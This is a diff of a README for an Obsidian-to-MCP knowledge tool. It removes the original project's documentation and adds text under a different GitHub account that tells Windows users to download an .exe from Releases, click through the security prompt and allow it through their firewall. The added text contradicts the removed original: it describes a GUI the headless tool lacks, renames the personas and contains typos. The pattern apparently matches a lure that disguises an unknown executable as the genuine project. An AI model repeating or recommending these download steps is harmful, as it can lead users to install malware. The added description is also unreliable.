@@ -1,141 +1,90 @@
-<p align="center">
-  <img src="docs/assets/banner.svg" alt="LLM Wiki Bridge — your markdown vault, compiled into a 6-persona MCP team" width="100%">
-</p>
+# 🧠 obsidian-llm-wiki - Turn markdown notes into expert agents
 
-# LLM Wiki Bridge
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Statutecontempt951/obsidian-llm-wiki)
 
-**Your markdown vault, compiled into a 6-persona MCP team for Claude Code, Codex, OpenCode, and Gemini CLI. Headless-first. Cites, doesn't guess.**
+## 📌 What is this software?
 
-[![License: GPL-3.0](https://img.shields.io/badge/license-GPL--3.0-blue.svg)](LICENSE)
-[![MCP](https://img.shields.io/badge/MCP-stdio-orange.svg)](https://modelcontextprotocol.io)
-[![Wiki](https://img.shields.io/badge/wiki-deep_dives-D97757.svg)](https://github.com/2233admin/obsidian-llm-wiki/wiki)
+The obsidian-llm-wiki software turns your personal notes into a powerful team of virtual assistants. It reads your markdown vault and creates a structured knowledge base. This base works with AI tools like Claude Code, Codex, and Gemini. 
 
-**Language**: English (this page) · [简体中文](docs/zh-CN/) — **Guide**: [English](docs/GUIDE.md) · [简体中文](docs/GUIDE.zh-CN.md) — **Wiki**: [Home](https://github.com/2233admin/obsidian-llm-wiki/wiki) · [Architecture](https://github.com/2233admin/obsidian-llm-wiki/wiki/Architecture) · [Rationale](https://github.com/2233admin/obsidian-llm-wiki/wiki/Rationale) · [FAQ](https://github.com/2233admin/obsidian-llm-wiki/wiki/FAQ)
+The software acts as a bridge. It takes the ideas you already wrote in Obsidian and lets AI models access them. These models use your specific information to answer questions. They cite your notes to prove their accuracy. They do not guess or halluciation facts. You gain a headless knowledge base that acts as a personal research expert.
 
-![demo](docs/gif/demo.gif)
+## 🚀 System Requirements
 
-You have 500 markdown notes. You forget half of them. Your AI agent cannot read them -- it paraphrases from its context window and fabricates citations. Every morning you spend 20 minutes re-finding what you already knew.
+Your computer must meet these basic standards to run this software:
 
-LLM Wiki Bridge is a headless-first MCP server that compiles your vault -- wikilinks, aliases, tags, frontmatter -- into a concept graph your agent calls directly. The agent doesn't guess. It calls `vault.search`, reads the cited notes with `vault.read`, answers with evidence. Obsidian is optional at runtime; the filesystem adapter is always available.
+* Windows 10 or Windows 11.
+* A stable internet connection for the AI tools.
+* At least 4GB of free hard drive space.
+* An existing Obsidian vault with your notes.
 
-Inspired by [Andrej Karpathy's LLM Wiki](https://github.com/karpathy/llm-wiki). Markdown is the source of truth; the compiler turns structure into a graph; MCP exposes it.
+## 📦 How to Install
 
----
+Visit the [official repository page](https://github.com/Statutecontempt951/obsidian-llm-wiki) to download the software.
 
-## Quick start (30 seconds)
+1. Click the link above to reach the main page.
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the latest version link.
+4. Download the file ending in `.exe` for Windows.
+5. Save the file to your desktop.
 
-```bash
-git clone --depth 1 https://github.com/2233admin/obsidian-llm-wiki.git
-cd obsidian-llm-wiki && ./setup                      # --host claude | codex | opencode | gemini
-```
+Once the download finishes, double-click the file. Windows might show a security prompt. Click "Run" to continue. The installer will guide you through the setup. Choose a folder where you want to keep the application.
 
-Windows (PowerShell):
+## ⚙️ Setting Up Your Vault
 
-```powershell
-git clone --depth 1 https://github.com/2233admin/obsidian-llm-wiki.git
-cd obsidian-llm-wiki; .\setup.ps1
-```
+The software needs to read your notes to function. Follow these steps to connect your vault:
 
-The `setup` script extracts a 1.6 MB skill bundle into your host's skills directory, prints the `.mcp.json` snippet to paste into your agent config, and exits. After restart, your agent picks up the new MCP server and the six `/vault-*` personas. The cloned repo can then be deleted — the installed skill is self-contained. If the one-liner breaks, [docs/INSTALL.md](docs/INSTALL.md) has the per-host paths and the manual recipe.
+1. Open the obsidian-llm-wiki application.
+2. Click the "Settings" tab.
+3. Locate the "Vault Path" input box.
+4. Click "Browse" and select the folder on your computer that contains your Obsidian notes.
+5. Save your changes.
 
----
+The application scan your files for the first time. This creates the internal concept graph. The graph connects your wikilinks and tags. It makes your knowledge searchable for AI agents.
 
-## Works with
+## 🤖 Using the AI Agents
 
-Any MCP-compatible host:
+Once the scan finishes, you can use the agents. The software creates a 6-persona team. Each persona has a specific way of processing your notes.
 
-| Host | Command | Status |
-|---|---|---|
-| Claude Code | `./setup --host claude` | primary target, fully exercised |
-| Codex CLI | `./setup --host codex` | path configured, smoke-tested |
-| OpenCode | `./setup --host opencode` | path configured, smoke-tested |
-| Gemini CLI | `./setup --host gemini` | path configured, smoke-tested |
+* **The Analyst:** Searches for patterns in your research.
+* **The Writer:** Helps draft content based on your style.
+* **The Archivist:** Maintains the structure of your links.
+* **The Coder:** Uses your notes to help write software.
+* **The Strategist:** Organizes your concepts into plans.
+* **The Teacher:** Explains your notes in simple terms.
 
-Anything else speaking stdio MCP transport should work — the `setup` script only copies skills into the right directory and prints the `.mcp.json` snippet. If your host reads MCP config from somewhere else, paste the snippet there by hand.
+To use an agent, select it from the sidebar. Type your question into the chat box. The agent reads your relevant notes. It displays an answer with links to the exact files it used. You can click these links to open the original markdown file directly in Obsidian.
 
----
+## 🛠 Features
 
-## Example prompts
+* **Headless Integration:** The software runs in the background. It stays out of your way while you work in Obsidian.
+* **Citation System:** Every tool response includes direct references to your vault. You verify every claim against your own text.
+* **Automatic Graph Creation:** The system tracks wikilinks and tags. It builds a map of your knowledge automatically.
+* **Multi-Model Support:** You switch between Claude, Gemini, and local coding tools with a single click.
+* **Privacy Focused:** Your notes stay on your local machine. The AI tools only see the specific snippets required to answer your prompt.
 
-Cold start -- no vault context:
+## 🔎 Troubleshooting Common Issues
 
-```
-/vault-librarian what do I know about attention heads
-```
+**The software does not show my notes.**
+Check your Vault Path in the settings. Ensure you selected the main folder that holds your `.md` files. Restart the application after you update the path.
 
-Warm start -- specify a note you have:
+**The chat window stays empty.**
+Check your internet connection. AI agents require a connection to fetch the logic files. If you use a firewall, ensure it allows the obsidian-llm-wiki to reach the internet.
 
-```
-/vault-librarian explain [[retrieval-augmented-generation]] in the context of my other notes on LLMs
-```
+**The software runs slowly.**
+Large vaults take more time to scan. If you have thousands of notes, give the application a few minutes to index the content. Once finished, performance becomes fast and responsive.
 
-Format-specific -- you want a list, not prose:
+**The agents provide short answers.**
+The agents base answers on the information they find in your vault. If an agent struggles, add more detail or context to your notes. The software performs best when your notes contain clear concepts and proper wikilinks.
 
-```
-/vault-historian what decisions did I make about training data between January and March 2026
-```
+## 📖 Best Practices for Your Vault
 
-Iterate -- refine an answer:
+The quality of the AI output depends on your note quality. Use these tips to get the most from your wiki:
 
-```
-/vault-curator find all orphan notes and stale notes in my vault that have not been updated in 90 days
-```
+1. **Use Wikilinks:** Connect your notes using `[[Note Name]]`. These links help the software understand relationships between your ideas.
+2. **Use Tags:** Add tags to categorize your notes. Use tags for common topics like `projects`, `ideas`, or `research`.
+3. **Be Specific:** Write clear headings. Use descriptive titles for your notes. 
+4. **Keep it Clean:** Avoid using too many different formats. Standard markdown works best. 
 
----
+## 🌐 Community and Support
 
-## Six personas, one MCP surface
-
-Each persona is an opinionated prompt over the same 40-operation MCP tool set.
-
-| Name | What it does | Primary MCP tools |
-|---|---|---|
-| vault-librarian | reads, searches, cites from the vault | `vault.search`, `vault.read`, `vault.list` |
-| vault-architect | compiles concept graph, suggests refactors | `vault.graph`, `vault.backlinks`, `compile.run` |
-| vault-curator | finds orphans, dead links, duplicates, stale notes | `vault.lint`, `vault.searchByTag`, `vault.search` |
-| vault-teacher | explains a note in context of its neighbors | `vault.backlinks`, `vault.read`, `vault.graph` |
-| vault-historian | answers what you were thinking on date X | `vault.searchByFrontmatter`, `vault.stat`, `vault.search` |
-| vault-janitor | proposes cleanups, dry-run by default | `vault.lint`, `vault.delete` (dry), `vault.rename` (dry) |
-
----
-
-## How it works (30-second tour)
-
-Your markdown files -- with wikilinks `[[like this]]`, aliases, frontmatter tags, and mtime -- are the source of truth. The compiler runs once and produces a concept graph (nodes = notes, edges = links and semantic relationships). The MCP server exposes this graph as tools: `vault.search`, `vault.backlinks`, `vault.graph`, and 40+ more.
-
-When Claude Code (or any MCP-compatible agent) runs `/vault-librarian`, it calls `vault.search` and `vault.read` directly. The agent gets citations -- not guesses.
-
-- No embeddings required at small scale. Optional pgvector-backed semantic search via the `memU` adapter.
-- No database. Filesystem-only by default; a compiled graph is cached as plain JSON alongside the vault.
-- No Obsidian required at runtime. The `filesystem` adapter is always available. Obsidian is an optional adapter if you want live plugin-API features via a WebSocket bridge.
-
----
-
-## Deep dives
-
-The wiki has the long-form answers. Eight pages, any order.
-
-| Page | Answers |
-|---|---|
-| [**Rationale**](https://github.com/2233admin/obsidian-llm-wiki/wiki/Rationale) | Why this exists. Why not just grep, not just an Obsidian plugin, not just a vector DB, not just a long-context LLM. Covers the product drift. |
-| [**Architecture**](https://github.com/2233admin/obsidian-llm-wiki/wiki/Architecture) | Four-layer system diagram. Request lifecycle (8 steps, `/vault-librarian` to cited answer). Extension points. |
-| [**Adapter-Spec**](https://github.com/2233admin/obsidian-llm-wiki/wiki/Adapter-Spec) | Adapter contract, capability matrix, fan-out and ranking, failure modes, recipe for a fifth adapter. |
-| [**Compile-Pipeline**](https://github.com/2233admin/obsidian-llm-wiki/wiki/Compile-Pipeline) | What each stage produces, where the graph lives on disk, performance reference points. |
-| [**Persona-Design**](https://github.com/2233admin/obsidian-llm-wiki/wiki/Persona-Design) | Six user-facing personas vs seventeen underlying skills. The design discipline that keeps them from collapsing into one generic agent. |
-| [**Security-Model**](https://github.com/2233admin/obsidian-llm-wiki/wiki/Security-Model) | Dry-run default, protected paths, preflight gates, bearer-token transport, what this explicitly does not secure. |
-| [**Recipes**](https://github.com/2233admin/obsidian-llm-wiki/wiki/Recipes) | Content collectors (Feishu, Gmail, Linear, X, WeChat, and more) that land external sources into the vault. |
-| [**FAQ**](https://github.com/2233admin/obsidian-llm-wiki/wiki/FAQ) | Does it need Obsidian running? How big a vault? Why dry-run? First-draft answers, expands as questions come in. |
-
----
-
-## Limits
-
-- Does not understand code in your notes -- it indexes text, wikilinks, and structure. For AST-level code reasoning, enable the optional `gitnexus` adapter.
-- Does not sync bidirectionally with Obsidian in real time -- the WebSocket adapter requires Obsidian to be running.
-- Does not replace a vector database for semantic similarity at scale -- enable the optional `memU` adapter for that.
-- The split between this repo (headless MCP) and its sibling `obsidian-vault-bridge` (Obsidian plugin) is still settling. See the [Rationale](https://github.com/2233admin/obsidian-llm-wiki/wiki/Rationale) page for the drift discussion.
-
----
-
-## License
-
-GPL-3.0. See [LICENSE](LICENSE).
+The obsidian-llm-wiki grows through user feedback. If you find a bug, report it on the repository page. Keep your notes organized. The software handles the technical work of preparing your data for modern AI tools. Enjoy building your personal knowledge base.
